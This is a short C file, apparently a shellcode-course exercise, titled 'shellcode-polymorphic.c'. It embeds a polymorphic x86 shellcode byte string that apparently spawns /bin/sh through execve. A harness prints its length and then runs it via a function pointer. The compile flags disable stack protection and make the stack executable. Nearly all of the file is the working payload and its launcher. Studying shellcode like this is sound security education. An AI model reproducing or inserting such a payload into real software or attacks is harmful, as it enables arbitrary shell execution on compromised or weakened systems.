/*
Filename:      shellcode-polymorphic.c
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  05.12.2018
Note:          x86 code but compiled on x64
Compiler:      gcc -m32 -ggdb -fno-stack-protector -z execstack shellcode-polymorphic.c -o shellcode-polymorphic
*/

#include<stdio.h>
#include<string.h>

unsigned char code [] = \
"\x31\xc9\x89\xc8\xb1\x0b\x50\x40\xe2\xfd\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

main()
{
  printf("Shellcode Lenght: %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
